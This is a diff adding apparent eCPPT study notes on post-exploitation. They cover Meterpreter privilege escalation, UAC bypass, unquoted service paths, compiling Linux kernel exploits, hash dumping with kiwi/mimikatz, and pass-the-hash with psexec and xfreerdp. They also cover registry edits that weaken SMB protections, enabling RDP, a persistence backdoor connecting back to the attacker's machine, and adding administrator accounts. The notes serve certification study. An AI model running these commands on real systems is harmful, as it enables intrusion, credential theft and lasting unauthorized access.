@@ -1,0 +1,213 @@
+Post Exploitation:
+Privilege Escalation and Maintaining Access
+
+To automatically migrate to a different process utilize the getpid command in meterpreter
+	Meterpreter script will not try and increase privileges however, privs will stay the same just the process will be changed
+	this could be useful if you are using a web exploit and you want to make sure if the user closes out of the webpage the exploit still works
+
+The easiest way to increase privs is to utilize getsystem in meterpreter which will try and automatically increase privs
+By default getsystem tries all the different techniques in meterpreter, however if you want to run a ceratin technique use -t x (where x = number to run)
+Depending on current privileges on the machine you may not be able to use getsystem
+	IF UAC IS ENABLED ON A REMOTE SYSTEM, GETSYSTEM WILL NOT WORK
+		TO BYPASS USE A bypassuac module
+			post/windows/gather/win_privs
+			If UAC Enabled is set to true then the remote system has UAC enabled
+		search bypassuac
+			a few options should come up
+		bypassuac_vbs module is the newest module at the time of writing
+		we have to set the session ID to tell it which module to run on
+		run the module
+If we can bypass everything then we will get another meterpreter shell that will then have the highest privileges on that target machine
+Remember UAC still exists, we just bypassed it for the time being
+
+After you have increased your privileges you can utilize incognito
+	This has been migrated to metasploit
+		use incongnito
+		after using inconginito we can view and impersonate tokens
+			list_tokens
+			impersonate_tokes
+
+Unquoted Service Paths
+	This is another method we can use for persistence or for escalating our privileges 
+	The issue arises when a Windows service has been configured with a patch to a service binary which is unquoted and contains spaces in its path
+		Pretty much if there are spaces, you can mess it up!
+Example:
+	C:\Program Files(x86)\Canon\My Scan Utility\ryan.exe
+		The above example gives us 2 options in regard to an executable we can drop and in which directory
+			C:\Program.exe
+			C:\Program Files(x86)\Canon\My.exe
+	We can make a program.exe or a my.exe and it will launch instead of running ryan.exe
+
+How to check for Unquoted Service Paths
+	WMI Command Line Tool (WMIC) to query for all services and paths, specifically searching for unquoted
+	paths with the following command line:
+		C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+	We can also use the "sc" Service Control command with the "qc" (show config) option to query a specific service and manually check for an unquoted path
+How to check automatically with Metasploit
+	use exploit/windows/local/trusted_service_path
+We need to know both ways because Metasploit may not always work to find and exploit unquoted service path vulnerabilities
+
+LINUX PRIV ESC
+The above is all Windows attacks, now we are going to focus on Linux
+
+Best way to gain Priv Esc is to look up the current OS and then searching for publicly available exploits
+eCPPT focuses a lot on actual OS exploits, looking up the OS on the web and finding exploits on the web for those versions numbers
+
+For the OS attacks, when finding the exploits we may need to compile them ourselves. 
+The above scenario also believes that you already have a session with the target machine
+Utilizing Metasploit we are able to upload the exploit that was found after it is compiled
+	upload <directory> .
+		MAKE SURE TO PUT THE . AT THE END
+	go back into shell 
+		make sure you are root
+IF THE TARGET MACHINE DOES NOT HAVE GCC WE CANNOT COMPILE THE EXPLOIT THERE AND WE HAVE TO DO IT LOCALLY
+IF OUR Operating System is 64-bit and the target machine is 32-bit we need to set the GCC parameters
+In order to compile an exploit such as this you would have to do it within kali cli
+	gcc -m32 -o linux_priv_esc 37292.c (or whatever the exploit is)
+	You should now have a file called linux_priv_esc
+	Make sure that it is executable
+Now we can upload that exploit to our target machine utilizing meterpreter
+again make sure the file permissions are executable
+	From there go back into shell
+	whoami and you should be root
+
+OTHER WAYS TO GET HIGHER PRIVS ON A MACHINE
+Explore permissions on processes running on the machine
+	sudo -l
+	suid find (which is on the desktop for me)
+	ps (in windows to see if printer services can be migrated to under NT SYSTEM/AUTHORITY
+We can also escalate privileges by replacing files like DLLs or executables
+	This may happen if you have the rights to write or edit files used by a service or process
+One of the examples that eCPPT gives is the following
+	An executable is running with system privileges and its executable is stored in a folder on which we have write permissions
+	We can change the file utilizing msfvenom, or inject the file with something like Shellter, BDF and so on
+	We can then try and restart the service (the classes states through DoS attack, however there may be other ways)
+
+MAINTAINING ACCESS:
+
+Once you get into the system and become root, or sys we need to keep those privileges through persistence
+Some ways to maintain access
+	RDP or VNC
+	If there are not any services we need to activate services
+	If you have to make a new user you have to add them to the proper groups
+ 
+PASSWORD HASH RECOVERY
+Once in a system we can do a load kiwi
+from there we can do a hashdump and try to crack those hashes
+We now have a username that we are able to continue to use to get into the system
+We may also be able to "run hashdump" depending on the version of meterpreter you have (which will do a little further digging)
+If we get permission denied, we may need to migrate to another service
+If we get pri_passwd_get_sam_hashes.... run hashdump and try to migrate to another service
+
+CRACK HASHES/PASS THE HASH
+If we are unable to crack hashes we may need to try and do pass the hash
+	psexec can utilize either passwords or pass the hash
+	use exploit/windows/smb/psexec
+There can be problems with pass the hash
+	If an account is not an actual administrator (RID-500) but is within the administrators group pass the hash will most likely not work
+	We will most likely get a STATUS_ACCESS_DENIED (Command=117 WordCount=0)
+The above deny status tells us that most likely the registry needs to be changed
+	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+		Add a new DWORD (32-bit) named
+			LocalAccountTokenFilterPolicy and set its value to
+Set-ItemProperty -Path
+HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System - Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword 
+	HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
+		add a new DWORD (32-bit) named RequireSecuritySignature and set its value to 0
+Set-ItemProperty -Path
+HKLM:\\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type Dword
+
+WE CAN ALSO USE THE REG COMMAND TO ACCOMPLISH THE SAME THING
+
+C:\> reg add
+"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+C:\ reg add
+"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
+
+THE REG CHANGES MAY ALLOW FOR NON RID-500 USER ACCOUNTS TO SUCCESSFULLY PASS-THE-HASH IN SOME CASES
+
+TO USE PASS-THE-HASH WITH RDP WE CAN USE "xfreerdp" 
+	To do this do the following
+		xfreerdp /u:(username) /d:(domain name such as foocorp) /pth:(hash) /v:(IP address)
+			xfreerdp /u:admin /d:foocorp /pth:<hash> /v:192.168.1.2
+
+TO USE MIMIKATZ WE MUST BE ON A 64-BIT PROCESS
+	This means that when we do a sysinfo if we are on a 32-bit system we need to migrate to a 64-bit process
+	Remember to see processes use the ps command
+	to migrate use migrate <pid> number
+After we load mimikatz (or kiwi) we may be able to use the wdigest to see plain text passwords
+
+USING WINDOWS CREDENTIALS EDITOR
+	THIS IS A WINDOWS BINARY, SO WE WILL HAVE TO UPLOAD IT ON THE REMOTE MACHINE WITH METERPRETER
+		execute -i -f wce.exe -a -h
+			THEY DID NOT DIG ANY DEEPER INTO THIS WITH THE LESSONS, HOWEVER MAY BE USEFUL INFORMATION
+
+ENABLE RDP SERVICE
+	To see what is already running on a machine use the following command
+		shell
+		net start
+		we may see that Remote Desktop Configuration, services and other things are on
+	ANOTHER WAY TO SEE WHAT IS RUNNING ON A WINDOWS MACHINE
+		wmic service where 'Caption like "Remote%" and started=true' get Caption
+	USING METERPRTER SCRIPTS TO CHECK SERVICES
+		run service_manager -l
+		run post/windows/gather/enum_services
+IF RDP IS DISABLED DO THE FOLLOWING IN METERPRETER
+	run getgui -h
+	run getgui -e
+		if username and password is known
+			-p and -u command can also be used
+	When we do the above commands RDP is enabled and we can have it automatically start when the user logs in
+GRANTING RDP PERMISSIONS IF USER IS NOT ALLOWED TO UTILIZE RDP
+	From windows shell run the following
+		net localgroup "<name of the group to add user to>" <username> /add
+			net localgroup "Remote Desktop Users" els_user /add
+	From here we can now try and establish an RDP session with the target machine
+		to see what groups are allowed do the following
+			net localgroup
+				net localgroup "Remote Desktop Users"
+				net localgroup "Administrators" <user> /add
+					net localgroup "Administrators" stduser /add
+						this would add stduser to an administrator group thus increasing their privleges on a network
+		We could do this for many different groups, such as putting users in TelnetClients group and more
+
+BACKDOOR
+	
+THE SCRIPT THAT IS SHOWN IN THE COURSEWARE ONLY WORKS ON WINDOWS MACHINES
+
+	In meterpreter run the following
+		run persistence -h
+			run persistence -A -X -i 5 -p 8080 -r <kali IP address>
+		The above script does the following
+			-A starts handler on kali machine
+			-X start the agent at boot
+				-X requires systems privs on the machine
+			-i 5 attempt to connect every 5 seconds
+			-p port you want to connect back to
+			-r kali linux ip address
+	After this script has been run we can see that everything went through, and see where the file went with meterpreter
+		reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v <file name>
+			the file name was shown when you ran the script above, will be a bunch of random letters
+	From here in Data we can see where the file is located
+Now we need to run a multi handler exploit
+	use exploit/multi/handler
+		make sure you use the same options as you did with the backdoor
+If we were to craft our own backdoor on MSFVenom you can upload the file through meterpreter
+	upload <path to backdoor on kali system> <path on target machine>
+		upload /root/my_bd.exe C:\\windows\
+	Now edit the windows registry key to load file at startup (this can again be done in meterpreter)
+		reg setval -k <registry_key_path> -d <value of the key> -v <name of the key>
+			regsetval -k
+			HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\my_bd.exe" -v bd_name
+
+NOW CREATE A NEW USER
+	In windows shell do the following
+		net user <user> <pass> /add
+			net user newuser newpass /add
+		net localgroup "Administrators" <user> /add
+			net localgroup "Administrators" newuser /add
+	This will creat a new user and allow us to put that user on an Administrator group thus creating persistence
+
+DLL HIJACKING / PRELOADING
+	This is done in the labs by writing to a DLL that a user can write to, however, escalates us to system privs
